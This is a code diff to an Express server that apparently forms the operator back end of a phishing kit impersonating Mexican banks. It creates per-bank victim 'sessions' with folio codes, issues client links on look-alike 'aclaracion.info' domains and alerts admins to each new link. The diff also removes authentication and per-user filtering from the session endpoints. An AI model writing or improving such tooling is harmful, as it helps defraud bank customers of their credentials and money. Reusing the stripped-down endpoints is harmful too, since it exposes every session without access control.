@@ -444,39 +444,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // Endpoint para buscar una sesión por su folio
-  app.get('/api/sessions/by-folio/:folio', async (req, res) => {
-    try {
-      const { folio } = req.params;
-      
-      // Obtenemos todas las sesiones activas
-      const activeSessions = await storage.getCurrentSessions();
-      
-      // Buscamos la sesión que coincida con el folio
-      const session = activeSessions.find(session => session.folio === folio);
-      
-      if (session) {
-        res.json({ 
-          sessionId: session.sessionId,
-          banco: session.banco
-        });
-      } else {
-        res.status(404).json({ message: "No session found with this folio" });
-      }
-    } catch (error) {
-      console.error("Error searching session by folio:", error);
-      res.status(500).json({ message: "Error searching session" });
-    }
-  });
-
   app.get('/api/sessions', async (req, res) => {
     try {
-      if (!req.isAuthenticated()) {
-        return res.status(401).json({ message: "No autenticado" });
-      }
-
       const { type = 'current' } = req.query;
-      const currentUser = req.user;
 
       let sessions;
       if (type === 'saved') {
@@ -485,12 +455,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
         sessions = await storage.getAllSessions();
       } else {
         sessions = await storage.getCurrentSessions();
-      }
-
-      // Filtrar para que cada usuario solo vea sus propias sesiones
-      // Los administradores pueden ver todas las sesiones
-      if (currentUser.role !== 'admin') {
-        sessions = sessions.filter(session => session.createdBy === currentUser.username);
       }
 
       res.json(sessions);
@@ -502,29 +466,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.post('/api/sessions', async (req, res) => {
     try {
-      if (!req.isAuthenticated()) {
-        return res.status(401).json({ message: "No autenticado" });
-      }
-      
-      const user = req.user;
       const { banco = "Invex" } = req.body;
       const sessionId = nanoid(10);
-      
-      // Generamos un código de 6 dígitos numéricos para el folio
-      const generateSixDigitCode = () => {
-        let code = '';
-        for (let i = 0; i < 6; i++) {
-          code += Math.floor(Math.random() * 10).toString();
-        }
-        return code;
-      };
-      
       const session = await storage.createSession({ 
         sessionId, 
         banco,
-        folio: generateSixDigitCode(),
+        folio: nanoid(6),
         pasoActual: ScreenType.FOLIO,
-        createdBy: user.username,
       });
       res.json(session);
     } catch (error) {
@@ -641,18 +589,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
         banco: banco as string,
         folio: sixDigitCode,
         pasoActual: ScreenType.FOLIO,
-        createdBy: user.username,
       });
 
-      // Utilizamos el dominio aclaraciones.info (plural) en lugar de aclaracion.info
-      const domain = 'aclaraciones.info';
+      // Utilizamos el dominio aclaracion.info en lugar de los dominios de Replit
+      const domain = 'aclaracion.info';
 
-      // Armamos el enlace final usando solo el código numérico sin "client"
-      const link = `https://${domain}/${sixDigitCode}`;
+      // Armamos el enlace final usando el dominio especificado
+      const link = `https://${domain}/client/${sessionId}`;
 
       console.log(`Nuevo enlace generado - Código: ${sixDigitCode}, Banco: ${banco}`);
       console.log(`URL del cliente: ${link}`);
-      console.log(`Generado por usuario: ${user.username}`);
+      console.log(`Generado por usuario: ${user.username}, Permisos de bancos: ${user.allowedBanks || 'all'}`);
 
       // Notificar a los clientes de admin sobre el nuevo enlace
       broadcastToAdmins(JSON.stringify({
